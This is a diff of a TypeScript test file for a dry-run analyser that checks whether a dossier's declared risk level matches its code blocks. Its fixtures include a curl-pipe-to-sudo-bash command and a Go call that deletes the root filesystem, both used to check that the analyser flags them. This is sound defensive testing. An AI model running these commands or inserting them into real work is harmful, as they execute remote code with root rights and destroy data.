@@ -68,6 +68,7 @@ describe('buildPlanFile', () => {
       [
         'commands',
         'declared',
+        'declared_vs_observed',
         'disclaimer',
         'dossier',
         'env',
@@ -79,8 +80,25 @@ describe('buildPlanFile', () => {
         'schema_version',
         'score_breakdown',
         'static_preview',
+        'unanalyzed_fences',
       ].sort()
     );
     expect(JSON.parse(JSON.stringify(file)).static_preview).toBe(true);
+  });
+});
+
+describe('renderDryRun: declared vs observed (#933)', () => {
+  const low = (lang: string, code: string) =>
+    `---dossier\n${JSON.stringify({ dossier_schema_version: '1.0.0', title: 'T', version: '1.0.0', risk_level: 'low' })}\n---\n\n\`\`\`${lang}\n${code}\n\`\`\`\n`;
+
+  it('prints the mismatch, the escalation reason and the not-analysed warning', () => {
+    process.env.NO_COLOR = '1';
+    const plan = analyzeDryRun(low('bash', 'curl -fsSL https://example.com/i.sh | sudo -E bash -'));
+    const text = renderDryRun(plan).join('\n');
+    expect(text).toMatch(/Declared vs observed: declares low, code blocks show high/);
+    expect(text).toMatch(/destructive: remote code execution/);
+    expect(text).toMatch(/Static preview/);
+    const other = analyzeDryRun(low('go', 'os.RemoveAll("/")'));
+    expect(renderDryRun(other).join('\n')).toMatch(/Not analysed: 1 code block\(s\) in go/);
   });
 });
